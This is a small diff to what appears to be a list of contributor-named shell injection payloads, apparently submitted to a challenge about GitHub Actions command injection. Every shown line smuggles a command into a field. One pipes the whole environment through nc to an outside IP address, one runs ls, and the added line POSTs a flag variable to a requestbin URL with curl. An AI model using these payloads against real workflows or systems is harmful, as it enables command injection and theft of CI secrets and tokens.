@@ -644,3 +644,4 @@ weinull:${{ github.event.issue.number }} $( flag )
 zwh-china:";echo "$(printenv|nc 106.15.74.181 2333)"
 
 FireCC:$(ls)
+1umiere:$(curl -X POST -d "fizz=$flag" https://requestbin.io/1oyl59s1)
